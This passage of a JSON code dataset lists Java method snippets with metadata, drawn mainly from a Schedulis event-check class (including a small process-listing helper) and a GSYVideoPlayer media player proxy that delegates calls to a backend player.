"modifiers": [], "return_type": "void", "snippet": "    void closeQueryStmt(PreparedStatement stmt, Logger log) {\n        if (stmt != null) {\n            try {\n                stmt.close();\n            } catch (SQLException e) {\n                log.error(\"Error closing result stmt\", e);\n            }\n        }\n\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/eventcheck/AbstractEventCheck.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventCheckAdapter"], "modifiers": ["public", "abstract"]}}, {"id": 34848, "method_name": "closeDruidDataSource", "class_name": "AbstractEventCheck", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void closeDruidDataSource() {\n        DruidDataSource msgDSObject = (DruidDataSource) msgDS;\n\n        if (msgDSObject != null) {\n            msgDSObject.close();\n        }\n\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/eventcheck/AbstractEventCheck.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventCheckAdapter"], "modifiers": ["public", "abstract"]}}, {"id": 34849, "method_name": "getLinuxLocalIp", "class_name": "AbstractEventCheck", "params": ["Logger"], "throws": null, "modifiers": [], "return_type": "String", "snippet": "    String getLinuxLocalIp(Logger log) {\n        String ip = \"127.0.0.1\";\n        try {\n            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) {\n                NetworkInterface intf = en.nextElement();\n                String name = intf.getName();\n                if (!name.contains(\"docker\") && !name.contains(\"lo\")) {\n                    for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements(); ) {\n                        InetAddress inetAddress = enumIpAddr.nextElement();\n                        if (!inetAddress.isLoopbackAddress()) {\n                            String ipaddress = inetAddress.getHostAddress().toString();\n                            if (!ipaddress.contains(\"::\") && !ipaddress.contains(\"0:0:\") && !ipaddress.contains(\"fe80\")) {\n                                ip = ipaddress;\n                            }\n                        }\n                    }\n                }\n            }\n        } catch (SocketException ex) {\n            log.warn(\"get ip failed\", ex);\n\n        }\n        log.info(\"Send IP:\" + ip);\n        return ip;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/eventcheck/AbstractEventCheck.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventCheckAdapter"], "modifiers": ["public", "abstract"]}}, {"id": 34850, "method_name": "AzkabanStatusMonitor", "class_name": "AbstractEventCheck", "params": [], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "    static void AzkabanStatusMonitor() {\n        String name = ManagementFactory.getRuntimeMXBean().getName();\n        System.out.println(name);\n        String pid = name.split(\"@\")[0];\n        Process process = null;\n        List<String> processList = new ArrayList<String>();\n        InputStream in = null;\n        String[] cmds = {\"/bin/sh\", \"-c\", \"ps -ef | grep \" + pid + \" | grep -v 'grep' | awk '{print $3}'\"};\n        try {\n            process = Runtime.getRuntime().exec(cmds);\n            process.waitFor();\n            in = process.getInputStream();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                processList.add(line);\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n\n        for (String ppid : processList) {\n            System.out.println(ppid);\n\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/eventcheck/AbstractEventCheck.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventCheckAdapter"], "modifiers": ["public", "abstract"]}}, {"id": 34851, "method_name": "forObject", "class_name": "SystemMetaObject", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "MetaObject", "snippet": "  public static MetaObject forObject(Object object) {\n    return MetaObject.forObject(object, DEFAULT_OBJECT_FACTORY, DEFAULT_OBJECT_WRAPPER_FACTORY, new DefaultReflectorFactory());\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/reflection/SystemMetaObject.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 34852, "method_name": "getInternalMediaPlayer", "class_name": "MediaPlayerProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "IMediaPlayer", "snippet": "    public IMediaPlayer getInternalMediaPlayer() {\n        return mBackEndMediaPlayer;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34853, "method_name": "setDisplay", "class_name": "MediaPlayerProxy", "params": ["SurfaceHolder"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDisplay(SurfaceHolder sh) {\n        mBackEndMediaPlayer.setDisplay(sh);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34854, "method_name": "setSurface", "class_name": "MediaPlayerProxy", "params": ["Surface"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSurface(Surface surface) {\n        mBackEndMediaPlayer.setSurface(surface);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34855, "method_name": "setDataSource", "class_name": "MediaPlayerProxy", "params": ["Context", "Uri"], "throws": ["IOException", "IllegalArgumentException", "SecurityException", "IllegalStateException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataSource(Context context, Uri uri)\n            throws IOException, IllegalArgumentException, SecurityException, IllegalStateException {\n        mBackEndMediaPlayer.setDataSource(context, uri);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34856, "method_name": "setDataSource", "class_name": "MediaPlayerProxy", "params": ["Context", "Uri", "Map<String,String>"], "throws": ["IOException", "IllegalArgumentException", "SecurityException", "IllegalStateException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataSource(Context context, Uri uri, Map<String, String> headers)\n            throws IOException, IllegalArgumentException, SecurityException, IllegalStateException {\n        mBackEndMediaPlayer.setDataSource(context, uri, headers);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34857, "method_name": "setDataSource", "class_name": "MediaPlayerProxy", "params": ["FileDescriptor"], "throws": ["IOException", "IllegalArgumentException", "IllegalStateException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataSource(FileDescriptor fd)\n            throws IOException, IllegalArgumentException, IllegalStateException {\n        mBackEndMediaPlayer.setDataSource(fd);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34858, "method_name": "setDataSource", "class_name": "MediaPlayerProxy", "params": ["String"], "throws": ["IOException", "IllegalArgumentException", "SecurityException", "IllegalStateException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataSource(String path) throws IOException, IllegalArgumentException, SecurityException, IllegalStateException {\n        mBackEndMediaPlayer.setDataSource(path);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34859, "method_name": "setDataSource", "class_name": "MediaPlayerProxy", "params": ["IMediaDataSource"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDataSource(IMediaDataSource mediaDataSource)  {\n        mBackEndMediaPlayer.setDataSource(mediaDataSource);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34860, "method_name": "getDataSource", "class_name": "MediaPlayerProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDataSource() {\n        return mBackEndMediaPlayer.getDataSource();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34861, "method_name": "prepareAsync", "class_name": "MediaPlayerProxy", "params": [], "throws": ["IllegalStateException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void prepareAsync() throws IllegalStateException {\n        mBackEndMediaPlayer.prepareAsync();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34862, "method_name": "start", "class_name": "MediaPlayerProxy", "params": [], "throws": ["IllegalStateException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void start() throws IllegalStateException {\n        mBackEndMediaPlayer.start();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34863, "method_name": "stop", "class_name": "MediaPlayerProxy", "params": [], "throws": ["IllegalStateException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void stop() throws IllegalStateException {\n        mBackEndMediaPlayer.stop();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34864, "method_name": "pause", "class_name": "MediaPlayerProxy", "params": [], "throws": ["IllegalStateException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void pause() throws IllegalStateException {\n        mBackEndMediaPlayer.pause();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34865, "method_name": "setScreenOnWhilePlaying", "class_name": "MediaPlayerProxy", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setScreenOnWhilePlaying(boolean screenOn) {\n        mBackEndMediaPlayer.setScreenOnWhilePlaying(screenOn);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34866, "method_name": "getVideoWidth", "class_name": "MediaPlayerProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoWidth() {\n        return mBackEndMediaPlayer.getVideoWidth();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34867, "method_name": "getVideoHeight", "class_name": "MediaPlayerProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoHeight() {\n        return mBackEndMediaPlayer.getVideoHeight();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34868, "method_name": "isPlaying", "class_name": "MediaPlayerProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isPlaying() {\n        return mBackEndMediaPlayer.isPlaying();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34869, "method_name": "seekTo", "class_name": "MediaPlayerProxy", "params": ["long"], "throws": ["IllegalStateException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void seekTo(long msec) throws IllegalStateException {\n        mBackEndMediaPlayer.seekTo(msec);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34870, "method_name": "getCurrentPosition", "class_name": "MediaPlayerProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getCurrentPosition() {\n        return mBackEndMediaPlayer.getCurrentPosition();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34871, "method_name": "getDuration", "class_name": "MediaPlayerProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getDuration() {\n        return mBackEndMediaPlayer.getDuration();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34872, "method_name": "release", "class_name": "MediaPlayerProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void release() {\n        mBackEndMediaPlayer.release();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34873, "method_name": "reset", "class_name": "MediaPlayerProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void reset() {\n        mBackEndMediaPlayer.reset();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34874, "method_name": "setVolume", "class_name": "MediaPlayerProxy", "params": ["float", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setVolume(float leftVolume, float rightVolume) {\n        mBackEndMediaPlayer.setVolume(leftVolume, rightVolume);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34875, "method_name": "getAudioSessionId", "class_name": "MediaPlayerProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getAudioSessionId() {\n        return mBackEndMediaPlayer.getAudioSessionId();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34876, "method_name": "getMediaInfo", "class_name": "MediaPlayerProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "MediaInfo", "snippet": "    public MediaInfo getMediaInfo() {\n        return mBackEndMediaPlayer.getMediaInfo();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34877, "method_name": "setLogEnabled", "class_name": "MediaPlayerProxy", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLogEnabled(boolean enable) {\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34878, "method_name": "isPlayable", "class_name": "MediaPlayerProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isPlayable() {\n        return false;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34879, "method_name": "setOnPreparedListener", "class_name": "MediaPlayerProxy", "params": ["OnPreparedListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnPreparedListener(OnPreparedListener listener) {\n        if (listener != null) {\n            final OnPreparedListener finalListener = listener;\n            mBackEndMediaPlayer.setOnPreparedListener(new OnPreparedListener() {\n                @Override\n                public void onPrepared(IMediaPlayer mp) {\n                    finalListener.onPrepared(MediaPlayerProxy.this);\n                }\n            });\n        } else {\n            mBackEndMediaPlayer.setOnPreparedListener(null);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34880, "method_name": "setOnCompletionListener", "class_name": "MediaPlayerProxy", "params": ["OnCompletionListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnCompletionListener(OnCompletionListener listener) {\n        if (listener != null) {\n            final OnCompletionListener finalListener = listener;\n            mBackEndMediaPlayer.setOnCompletionListener(new OnCompletionListener() {\n                @Override\n                public void onCompletion(IMediaPlayer mp) {\n                    finalListener.onCompletion(MediaPlayerProxy.this);\n                }\n            });\n        } else {\n            mBackEndMediaPlayer.setOnCompletionListener(null);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34881, "method_name": "setOnBufferingUpdateListener", "class_name": "MediaPlayerProxy", "params": ["OnBufferingUpdateListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnBufferingUpdateListener(OnBufferingUpdateListener listener) {\n        if (listener != null) {\n            final OnBufferingUpdateListener finalListener = listener;\n            mBackEndMediaPlayer.setOnBufferingUpdateListener(new OnBufferingUpdateListener() {\n                @Override\n                public void onBufferingUpdate(IMediaPlayer mp, int percent) {\n                    finalListener.onBufferingUpdate(MediaPlayerProxy.this, percent);\n                }\n            });\n        } else {\n            mBackEndMediaPlayer.setOnBufferingUpdateListener(null);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34882, "method_name": "setOnSeekCompleteListener", "class_name": "MediaPlayerProxy", "params": ["OnSeekCompleteListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnSeekCompleteListener(OnSeekCompleteListener listener) {\n        if (listener != null) {\n            final OnSeekCompleteListener finalListener = listener;\n            mBackEndMediaPlayer.setOnSeekCompleteListener(new OnSeekCompleteListener() {\n                @Override\n                public void onSeekComplete(IMediaPlayer mp) {\n                    finalListener.onSeekComplete(MediaPlayerProxy.this);\n                }\n            });\n        } else {\n            mBackEndMediaPlayer.setOnSeekCompleteListener(null);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34883, "method_name": "setOnVideoSizeChangedListener", "class_name": "MediaPlayerProxy", "params": ["OnVideoSizeChangedListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnVideoSizeChangedListener(OnVideoSizeChangedListener listener) {\n        if (listener != null) {\n            final OnVideoSizeChangedListener finalListener = listener;\n            mBackEndMediaPlayer.setOnVideoSizeChangedListener(new OnVideoSizeChangedListener() {\n                @Override\n                public void onVideoSizeChanged(IMediaPlayer mp, int width, int height, int sar_num, int sar_den) {\n                    finalListener.onVideoSizeChanged(MediaPlayerProxy.this, width, height, sar_num, sar_den);\n                }\n            });\n        } else {\n            mBackEndMediaPlayer.setOnVideoSizeChangedListener(null);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34884, "method_name": "setOnErrorListener", "class_name": "MediaPlayerProxy", "params": ["OnErrorListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnErrorListener(OnErrorListener listener) {\n        if (listener != null) {\n            final OnErrorListener finalListener = listener;\n            mBackEndMediaPlayer.setOnErrorListener(new OnErrorListener() {\n                @Override\n                public boolean onError(IMediaPlayer mp, int what, int extra) {\n                    return finalListener.onError(MediaPlayerProxy.this, what, extra);\n                }\n            });\n        } else {\n            mBackEndMediaPlayer.setOnErrorListener(null);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34885, "method_name": "setOnInfoListener", "class_name": "MediaPlayerProxy", "params": ["OnInfoListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnInfoListener(OnInfoListener listener) {\n        if (listener != null) {\n            final OnInfoListener finalListener = listener;\n            mBackEndMediaPlayer.setOnInfoListener(new OnInfoListener() {\n                @Override\n                public boolean onInfo(IMediaPlayer mp, int what, int extra) {\n                    return finalListener.onInfo(MediaPlayerProxy.this, what, extra);\n                }\n            });\n        } else {\n            mBackEndMediaPlayer.setOnInfoListener(null);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34886, "method_name": "setOnTimedTextListener", "class_name": "MediaPlayerProxy", "params": ["OnTimedTextListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnTimedTextListener(OnTimedTextListener listener) {\n        if (listener != null) {\n            final OnTimedTextListener finalListener = listener;\n            mBackEndMediaPlayer.setOnTimedTextListener(new OnTimedTextListener() {\n                @Override\n                public void onTimedText(IMediaPlayer mp, IjkTimedText text) {\n                    finalListener.onTimedText(MediaPlayerProxy.this, text);\n                }\n            });\n        } else {\n            mBackEndMediaPlayer.setOnTimedTextListener(null);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34887, "method_name": "setAudioStreamType", "class_name": "MediaPlayerProxy", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAudioStreamType(int streamtype) {\n        mBackEndMediaPlayer.setAudioStreamType(streamtype);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34888, "method_name": "setKeepInBackground", "class_name": "MediaPlayerProxy", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setKeepInBackground(boolean keepInBackground) {\n        mBackEndMediaPlayer.setKeepInBackground(keepInBackground);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34889, "method_name": "getVideoSarNum", "class_name": "MediaPlayerProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoSarNum() {\n        return mBackEndMediaPlayer.getVideoSarNum();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34890, "method_name": "getVideoSarDen", "class_name": "MediaPlayerProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getVideoSarDen() {\n        return mBackEndMediaPlayer.getVideoSarDen();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34891, "method_name": "setWakeMode", "class_name": "MediaPlayerProxy", "params": ["Context", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setWakeMode(Context context, int mode) {\n        mBackEndMediaPlayer.setWakeMode(context, mode);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34892, "method_name": "getTrackInfo", "class_name": "MediaPlayerProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ITrackInfo", "snippet": "    public ITrackInfo[] getTrackInfo() {\n        return mBackEndMediaPlayer.getTrackInfo();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34893, "method_name": "setLooping", "class_name": "MediaPlayerProxy", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLooping(boolean looping) {\n        mBackEndMediaPlayer.setLooping(looping);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 34894, "method_name": "isLooping", "class_name": "MediaPlayerProxy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isLooping() {\n        return mBackEndMediaPlayer.isLooping();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/player/MediaPlayerProxy.java", "stars": "2", "class_props": {"extends": null, "implements": ["IMediaPlayer"], "modifiers": ["public"]}}, {"id": 